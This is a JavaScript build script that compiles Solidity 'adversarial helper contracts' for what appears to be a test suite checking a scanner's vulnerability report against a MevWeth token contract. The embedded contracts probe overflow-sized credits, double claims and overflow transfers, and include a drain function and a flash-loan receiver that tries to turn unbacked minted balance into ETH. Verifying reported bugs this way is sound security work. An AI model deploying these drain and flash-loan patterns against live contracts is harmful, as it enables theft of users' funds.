// Compiles the adversarial helper contracts used by the payload suite.
const fs = require('fs');
const path = require('path');
const solc = require('solc8'); // 0.8.28 - the MevWeth contract itself is compiled by compile.js with 0.7.6

const SRC = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IMevWethMin {
    function getMev(uint256 value) external;
    function getMev(address to) external;
    function getMev(address to, uint256 value) external;
    function addMev(uint256 value) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function withdraw(uint256 value) external;
    function flashLoan(address receiver, address token, uint256 value, bytes calldata data) external returns (bool);
}

/// @dev Replays the scanner's stated mechanism: several overflow-sized credits in ONE
///      transaction, exactly like the report's "2 receivers x 2^255" payload.
contract Batcher {
    IMevWethMin public immutable weth;

    constructor(address target) { weth = IMevWethMin(target); }

    /// @return results per attempt: 0 = reverted, 1 = executed
    function twoReceiversTwo255(address a, address b) external returns (uint8[2] memory results) {
        try weth.getMev(a, type(uint256).max / 2) { results[0] = 1; } catch { results[0] = 0; }
        try weth.getMev(b, type(uint256).max / 2) { results[1] = 1; } catch { results[1] = 0; }
    }

    /// @dev Repeated single-receiver credits in one transaction.
    function repeatCredit(address a, uint256 times) external returns (uint256 accepted) {
        for (uint256 i = 0; i < times; i++) {
            try weth.getMev(a, type(uint256).max) { accepted++; } catch {}
        }
    }

    /// @dev Claim the pot twice in one transaction (transient-state reuse probe).
    function claimTwice() external returns (uint8[2] memory results) {
        try weth.getMev(address(this)) { results[0] = 1; } catch { results[0] = 0; }
        try weth.getMev(address(this)) { results[1] = 1; } catch { results[1] = 0; }
    }

    /// @dev Attempt a zero-balance debit with an overflow-sized credit.
    function overflowTransfer(address to) external returns (bool ok) {
        try weth.transfer(to, type(uint256).max) { return true; } catch { return false; }
    }

    /// @dev Pull credited tokens out to ETH inside the same transaction.
    function drain(address target) external returns (uint256 got) {
        got = weth.balanceOf(address(this));
        weth.withdraw(got);
        (bool s, ) = msg.sender.call{value: address(this).balance}("");
        require(s, "fwd");
    }

    receive() external payable {}
}

/// @dev ERC-3156 receiver that tries to launder a flash mint into ETH before repayment.
contract FlashProbe {
    IMevWethMin public immutable weth;
    address public immutable owner;

    constructor(address target) { weth = IMevWethMin(target); owner = msg.sender; }

    function onFlashLoan(address, address token, uint256 value, uint256, bytes calldata) external returns (bytes32) {
        // Try to convert the unbacked flash-minted balance into real ETH.
        if (token == address(weth)) {
            weth.withdraw(value);
            (bool s, ) = owner.call{value: value}("");
            require(s, "send");
        }
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function go(uint256 value) external {
        weth.flashLoan(address(this), address(weth), value, "");
    }

    receive() external payable {}
}
`;

const input = {
  language: 'Solidity',
  sources: { 'Helpers.sol': { content: SRC } },
  settings: {
    optimizer: { enabled: true, runs: 200 },
    evmVersion: 'cancun',
    outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
  },
};
const out = JSON.parse(solc.compile(JSON.stringify(input)));
for (const e of out.errors ?? []) if (e.severity === 'error') throw new Error(e.formattedMessage);
const res = {};
for (const name of Object.keys(out.contracts['Helpers.sol'])) {
  const c = out.contracts['Helpers.sol'][name];
  res[name] = { abi: c.abi, bytecode: '0x' + c.evm.bytecode.object };
}
const dest = path.join(__dirname, 'artifacts', 'Helpers.json');
fs.mkdirSync(path.dirname(dest), { recursive: true });
fs.writeFileSync(dest, JSON.stringify(res, null, 2));
console.log('compiled helpers:', Object.keys(res).join(', '));
